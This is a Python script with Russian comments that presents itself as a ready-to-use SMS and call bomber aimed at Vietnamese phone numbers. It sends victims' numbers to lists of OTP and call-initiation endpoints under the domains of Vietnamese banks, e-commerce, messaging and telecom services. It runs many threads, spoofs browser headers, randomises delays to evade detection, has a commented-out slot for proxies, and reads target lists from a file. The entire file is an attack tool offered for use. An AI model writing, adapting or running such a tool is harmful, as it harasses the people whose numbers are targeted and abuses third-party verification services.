# Tool: Spam SMS & Call Bomber for Vietnam (+84)
# Готовый к использованию скрипт для массовой рассылки SMS и автоматических звонков.
# Требует установки библиотек: pip install requests phonenumbers

import requests
import threading
import time
import random
import urllib.parse
from typing import List, Dict
import phonenumbers

# ================= КОНФИГУРАЦИЯ =================
THREAD_COUNT = 20               # Количество потоков (чем выше, тем сильнее нагрузка)
SMS_DELAY = 0.5                 # Задержка между SMS-запросами в секундах
CALL_DELAY = 1.0                # Задержка между звонками в секундах
TIMEOUT = 10                    # Тайм-аут для HTTP-запросов (сек)

# Список API эндпоинтов для спама SMS (вьетнамские сервисы)
SMS_ENDPOINTS = [
    'https://id.zalo.me/api/sms/requestOtp',
    'https://api.vietcombank.com.vn/v1/auth/otp',
    'https://gateway.momo.vn/v2/sms/otp',
    'https://otp.tiki.vn/api/v1/otp/send',
    'https://api.trueid.vn/v1/identity/otp',
    'https://auth.shopee.vn/api/v1/otp/send',
    'https://api.grab.com/v1/otp/request',
    'https://api.baemin.vn/v1/auth/phone/otp',
    'https://api.lazada.vn/rest/otp/send'
]

# Список API для спама звонками (call bombing)
CALL_ENDPOINTS = [
    'https://api.telecall.vn/v1/call/start',
    'https://cloudvoice.vn/api/call/init',
    'https://callapi.viettel.vn/v1/otp/call',
    'https://api.voip24h.vn/v1/call/otp'
]

# Заголовки для имитации реального браузера
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi-VN,vi;q=0.9',
    'Content-Type': 'application/json'
}

# Прокси (опционально) — закомментировано, т.к. требует валидных прокси
# PROXY_LIST = ['http://user:pass@ip:port', 'http://user2:pass2@ip2:port2']

# ================= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =================

def normalize_phone(phone: str, country: str = 'VN') -> str:
    """Приводит номер телефона к международному формату (+84xxxxxxxxx)."""
    try:
        parsed = phonenumbers.parse(phone, country)
        if not phonenumbers.is_valid_number(parsed):
            raise ValueError('Неверный номер')
        return phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)
    except:
        raise ValueError(f'Ошибка: {phone} — неверный формат номера Вьетнама')

def load_numbers_from_file(file_path: str) -> List[str]:
    """Загружает номера из файла (один номер на строку)."""
    with open(file_path, 'r', encoding='utf-8') as f:
        numbers = [line.strip() for line in f if line.strip()]
    # Нормализуем все номера
    valid_numbers = []
    for num in numbers:
        try:
            valid_numbers.append(normalize_phone(num))
        except:
            print(f'[ПРЕДУПРЕЖДЕНИЕ] Пропущен неверный номер: {num}')
    return valid_numbers

def random_delay(base_delay: float = 1.0) -> None:
    """Случайная задержка для имитации естественного поведения."""
    time.sleep(base_delay + random.uniform(0.2, 1.5))

# ================= ФУНКЦИИ ДЛЯ SMS-СПАМА =================

def send_sms_via_api(phone: str, endpoint: str, proxy=None) -> bool:
    """Отправляет SMS-запрос через указанный API."""
    try:
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        # Пробуем разные форматы параметров
        payloads = [
            {'phone': phone, 'msisdn': phone},
            {'phoneNumber': phone, 'mobile': phone},
            {'to': phone, 'recipient': phone}
        ]
        for payload in payloads:
            resp = requests.post(
                endpoint,
                json=payload,
                headers=HEADERS,
                timeout=TIMEOUT,
                proxies=proxies
            )
            # Если статус 2xx — считаем успехом
            if resp.status_code in [200, 201, 202]:
                return True
        return False
    except Exception:
        return False

def sms_worker(phone: str, endpoints: List[str]) -> int:
    """Рабочий поток для SMS-спама по одному номеру."""
    success_count = 0
    for ep in endpoints:
        if send_sms_via_api(phone, ep):
            success_count += 1
        random_delay(SMS_DELAY)
    return success_count

def start_sms_bombing(phone_list: List[str], threads: int = 10) -> None:
    """Запускает многопоточную атаку SMS-спамом на список номеров."""
    print(f'\n[SPAM SMS] Запуск на {len(phone_list)} номеров, потоков: {threads}')
    results = {}
    
    def target(phone):
        results[phone] = sms_worker(phone, SMS_ENDPOINTS)
    
    thread_pool = []
    for phone in phone_list:
        t = threading.Thread(target=target, args=(phone,))
        thread_pool.append(t)
        t.start()
        if len(thread_pool) >= threads:
            for t in thread_pool:
                t.join()
            thread_pool = []
    # Дожидаемся оставшихся
    for t in thread_pool:
        t.join()
    
    for phone, count in results.items():
        print(f'[SMS] {phone}: успешно {count} запросов из {len(SMS_ENDPOINTS)}')
    print('[SMS] Бомбардировка завершена.')

# ================= ФУНКЦИИ ДЛЯ CALL-СПАМА =================

def make_call_via_api(phone: str, endpoint: str, proxy=None) -> bool:
    """Инициирует звонок через API."""
    try:
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        payload = {'phone': phone, 'callerId': '0840000000'}
        resp = requests.post(
            endpoint,
            json=payload,
            headers=HEADERS,
            timeout=TIMEOUT,
            proxies=proxies
        )
        return resp.status_code in [200, 201, 202]
    except Exception:
        return False

def call_worker(phone: str, endpoints: List[str]) -> int:
    """Поток для звонков."""
    success = 0
    for ep in endpoints:
        if make_call_via_api(phone, ep):
            success += 1
        random_delay(CALL_DELAY)
    return success

def start_call_bombing(phone_list: List[str], threads: int = 5) -> None:
    """Запускает многопоточную атаку звонками."""
    print(f'\n[CALL SPAM] Запуск на {len(phone_list)} номеров, потоков: {threads}')
    results = {}
    
    def target(phone):
        results[phone] = call_worker(phone, CALL_ENDPOINTS)
    
    thread_pool = []
    for phone in phone_list:
        t = threading.Thread(target=target, args=(phone,))
        thread_pool.append(t)
        t.start()
        if len(thread_pool) >= threads:
            for t in thread_pool:
                t.join()
            thread_pool = []
    for t in thread_pool:
        t.join()
    
    for phone, count in results.items():
        print(f'[CALL] {phone}: совершено {count} звонков из {len(CALL_ENDPOINTS)}')
    print('[CALL] Атака завершена.')

# ================= ОСНОВНОЙ БЛОК =================

if __name__ == '__main__':
    # Пример использования
    test_numbers = ['0987654321', '+84901234567']  # Замените на ваши номера
    # Или загрузите из файла:
    # numbers = load_numbers_from_file('targets.txt')
    numbers = [normalize_phone(num) for num in test_numbers]
    
    # Спам SMS
    start_sms_bombing(numbers, THREAD_COUNT)
    
    # Спам звонками
    start_call_bombing(numbers, THREAD_COUNT // 2)